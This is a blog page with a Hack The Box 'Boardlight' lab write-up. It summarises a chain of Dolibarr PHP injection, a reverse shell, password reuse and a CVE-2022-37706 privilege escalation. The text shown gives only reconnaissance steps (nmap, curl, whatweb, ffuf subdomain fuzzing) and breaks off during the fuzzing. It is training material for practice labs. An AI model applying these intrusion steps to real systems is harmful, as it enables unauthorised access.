<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
    crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
    </script>
  <link rel="stylesheet" href="/assets/css/style.css?v=c57113be8e88f55f8f2c22611adca09c9b4582f6">
  <link rel="stylesheet" href="/assets/css/prism.css">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
  
  <meta name="theme-color" content="#000000" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HTB Boardlight writeup | Gabriel blog</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="HTB Boardlight writeup" />
<meta name="author" content="gabri47" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Boardlight is a linux machine that involves dolibarr exploitation and an enlightenment cve. First, a discovered subdomain uses dolibarr 17.0.0 as crm which is vulnerable to php injection that I used to receive a reverse shell as www-data. With that access, I had permissions to read php configuration files where mysql password is saved and it’s reused for larissa system user. Finally, looking for files with SUID permissions, I saw enlightenment_sys binary which is vulnerable to CVE-2022-37706 (code injection) and as the owner is root I can access as him." />
<meta property="og:description" content="Boardlight is a linux machine that involves dolibarr exploitation and an enlightenment cve. First, a discovered subdomain uses dolibarr 17.0.0 as crm which is vulnerable to php injection that I used to receive a reverse shell as www-data. With that access, I had permissions to read php configuration files where mysql password is saved and it’s reused for larissa system user. Finally, looking for files with SUID permissions, I saw enlightenment_sys binary which is vulnerable to CVE-2022-37706 (code injection) and as the owner is root I can access as him." />
<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Boardlight.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Boardlight.html" />
<meta property="og:site_name" content="Gabriel blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-09-28T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HTB Boardlight writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-09-28T00:00:00+02:00","datePublished":"2024-09-28T00:00:00+02:00","description":"Boardlight is a linux machine that involves dolibarr exploitation and an enlightenment cve. First, a discovered subdomain uses dolibarr 17.0.0 as crm which is vulnerable to php injection that I used to receive a reverse shell as www-data. With that access, I had permissions to read php configuration files where mysql password is saved and it’s reused for larissa system user. Finally, looking for files with SUID permissions, I saw enlightenment_sys binary which is vulnerable to CVE-2022-37706 (code injection) and as the owner is root I can access as him.","headline":"HTB Boardlight writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Boardlight.html"},"url":"http://localhost:4000/writeups/2024/HTB/Boardlight.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>

<body>

  <div id="header">
    <div class="container">
      <div class="title-container">
        <a id="a-title" href="/">
          <h1>Gabriel blog</h1>
        </a>
        <small class="nav-main d-flex justify-content-center">
    
    <a href = "/writeups">Writeups</a>
    
    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
    
    
    <a href = "/blog">Blog</a>
    
    
</small>

      </div>
      <br>

      
      
<nav class="navbar navlinks">
    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
        <span>HTB Writeups</span>
        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
    </button>

    <div class="navbar-collapse collapse" id="navbarSupportedContent">
        <div class="m-1 mt-2">

            
            
            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Freelancer.html"> HTB Freelancer writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Boardlight.html"> HTB Boardlight writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Solarlab.html"> HTB Solarlab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Intuition.html"> HTB Intuition writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Mailing.html"> HTB Mailing writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Skyfall.html"> HTB Skyfall writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Runner.html"> HTB Runner writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/FormulaX.html"> HTB FormulaX writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Usage.html"> HTB Usage writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/IClean.html"> HTB IClean writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Headless.html"> HTB Headless writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Corporate.html"> HTB Corporate writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Perfection.html"> HTB Perfection writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Jab.html"> HTB Jab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Office.html"> HTB Office writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Crafty.html"> HTB Crafty writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HTB Pov Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HTB Analysis Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HTB Bizness Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HTB Ouija Writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HTB Monitored Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HTB Napper Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HTB Surveillance writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HTB Hospital Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HTB Codify Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            
            

        </div>
    </div>
</nav>

      
      <div id="bottom-bar">
        <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

      </div>
    </div>
  </div>

  <div id="content" class="container">
    <section id="main_content">
      <h5 class="mt-0 mb-2">
        
        
          HTB
        
        
      </h5>
    
      <h1 class="d-flex w-100 justify-content-between">
        
        
          <span>HTB Boardlight writeup</span> <span class="points"> [20 pts] </span>
        
        
      </h1>


<script>

</script>


<p>Boardlight is a linux machine that involves dolibarr exploitation and an enlightenment cve. First, a discovered subdomain uses dolibarr 17.0.0 as crm which is vulnerable to php injection that I used to receive a reverse shell as www-data. With that access, I had permissions to read php configuration files where mysql password is saved and it’s reused for larissa system user. Finally, looking for files with SUID permissions, I saw enlightenment_sys binary which is vulnerable to <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">CVE-2022-37706</a> (code injection) and as the owner is root I can access as him.</p>
    
      <h1 id="ports-recognaissance">
        
        
          Ports recognaissance <a href="#ports-recognaissance" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<pre><code class="language-bash">❯ sudo nmap -sS --min-rate 5000 -p- --open -v -n -Pn -sVC 10.10.11.11 -oA boardlight
&lt;..SNIP..&gt;
❯ cat boardlight.nmap
# Nmap 7.94SVN scan initiated Fri Sep 27 18:18:39 2024 as: nmap -sS --min-rate 5000 -p- --open -v -n -Pn -sVC -oA boardlight 10.10.11.11
Nmap scan report for 10.10.11.11
Host is up (0.36s latency).
Not shown: 59342 closed tcp ports (reset), 6191 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 27 18:19:15 2024 -- 1 IP address (1 host up) scanned in 35.87 seconds
</code></pre>

<ul>
  <li><code>-sVC</code>: Identifies service and version.</li>
  <li><code>-p-</code>: scans all the range of ports (1-65535).</li>
  <li><code>--open</code>: shows only open ports and not filtered or closed.</li>
  <li><code>-sS</code>: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
  <li><code>--min-rate 5000</code>: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
  <li><code>-n</code>: Disables DNS resolution protocol.</li>
  <li><code>-v</code>: Enables verbose to see which ports are opened while it’s scanning</li>
  <li><code>-Pn</code>: Disables host discovery protocol (ping).</li>
  <li><code>-oA &lt;file&gt;</code>: Exports the evidence to multiple files in different formats.</li>
</ul>

<p>There are two ports open, 22 and 80.</p>

<ul>
  <li>80 -&gt; HTTP, Apache 2.4.41.</li>
  <li>22 -&gt; OpenSSH 8.2p1 Ubuntu, useful when I get credentials or keys.</li>
</ul>

<p>I don’t have creds for ssh so I will jump into port 80.</p>
    
      <h1 id="web-enumeration-port-80">
        
        
          Web enumeration (Port 80) <a href="#web-enumeration-port-80" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Taking a look with curl, I can see that it doesn’t have a title and nothing more interesting:</p>

<pre><code class="language-bash">❯ curl -i -s http://10.10.11.11 | less
HTTP/1.1 200 OK
Date: Fri, 27 Sep 2024 16:25:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

&lt;!DOCTYPE html&gt;
&lt;html&gt;

&lt;head&gt;
  &lt;!-- Basic --&gt;
  &lt;meta charset="utf-8" /&gt;
  &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
  &lt;!-- Mobile Metas --&gt;
  &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /&gt;
  &lt;!-- Site Metas --&gt;
  &lt;meta name="keywords" content="" /&gt;
  &lt;meta name="description" content="" /&gt;
  &lt;meta name="author" content="" /&gt;


  &lt;!-- slider stylesheet --&gt;
  &lt;!-- slider stylesheet --&gt;
  &lt;link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css" /&gt;

  &lt;!-- bootstrap core css --&gt;
  &lt;link rel="stylesheet" type="text/css" href="css/bootstrap.css" /&gt;

  &lt;!-- fonts style --&gt;
  &lt;link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,700&amp;display=swap" rel="stylesheet"&gt;
  &lt;!-- Custom styles for this template --&gt;
  &lt;link href="css/style.css" rel="stylesheet" /&gt;
  &lt;!-- responsive style --&gt;
  &lt;link href="css/responsive.css" rel="stylesheet" /&gt;
&lt;/head&gt;
&lt;..SNIP..&gt;
</code></pre>

<p>Also, whatweb doesn’t shows anything interesting appart from an email info@board.htb:</p>

<pre><code class="language-bash">❯ whatweb http://10.10.11.11
http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
</code></pre>

<p>Taking a look in the browser shows that it’s a landing page:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240927183029.png" alt="" /></p>

<p>At the footer also appears the domain <code>board.htb</code>:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240927183115.png" alt="" /></p>

<p>So in case that this domain is used in apache to retrieve some different webpage, I will add it to the end of my /etc/hosts file for my system to know to which IP should solve that domain:</p>

<pre><code class="language-plaintext">❯ sudo vi /etc/hosts
10.10.11.11 board.htb
</code></pre>

<p>But that’s not the case because the md5 hash value of the whole page of both IP and domain is same (which means that the content is the same):</p>

<pre><code class="language-bash">❯ curl -s 10.10.11.11 | md5sum
6d780449d37c147a5c38a0eeff9d4f2d  -
❯ curl -s board.htb | md5sum
6d780449d37c147a5c38a0eeff9d4f2d  -
</code></pre>

<p>However, I still can enumerate subdomains with the <code>Host</code> header to see if someone is valid:</p>

<pre><code class="language-bash">❯ ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
